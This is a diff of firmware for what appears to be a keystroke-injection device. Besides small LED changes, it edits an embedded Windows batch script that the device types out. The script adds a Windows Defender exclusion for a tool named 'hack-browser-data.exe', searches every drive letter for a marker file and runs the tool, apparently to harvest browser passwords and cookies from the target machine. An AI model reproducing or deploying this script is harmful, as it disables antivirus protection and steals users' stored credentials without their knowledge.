@@ -41,7 +41,7 @@ void write_task(const char *str, const int del, bool enter = false)
     task_params.del = del;
     task_params.enter = enter;
 
-    blink(true);
+    led_blink(0, 255, 255, true);
 
     // Resume Task if handle is available
     if (write_task_handle != nullptr)
@@ -52,7 +52,7 @@ void write_task(const char *str, const int del, bool enter = false)
     // Wait for the writing task t  o complete
     if (xSemaphoreTake(write_complete_semaphore, portMAX_DELAY) == pdTRUE)
     {
-        blink(false);
+        led_idle(1, 1, 1);
     }
 }
 
@@ -126,13 +126,13 @@ notepad execute.bat
     const char data[] = R"(@echo off
 setlocal enabledelayedexpansion
 TIMEOUT /t 10 /nobreak
-powershell -Command Add-MpPreference -ExclusionPath "D:\hack-browser-data-windows-64bit.exe"
+powershell -Command Add-MpPreference -ExclusionPath "D:\hack-browser-data.exe"
 for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 if exist "%%d:\" (
     if exist "%%d:\find_temp_check.txt" (
             echo "find_temp_check.txt" found in %%d:\
         cd /d "%%d:\"
-            hack-browser-data-windows-64bit.exe  
+            hack-browser-data.exe  
         ) 
     )
 )
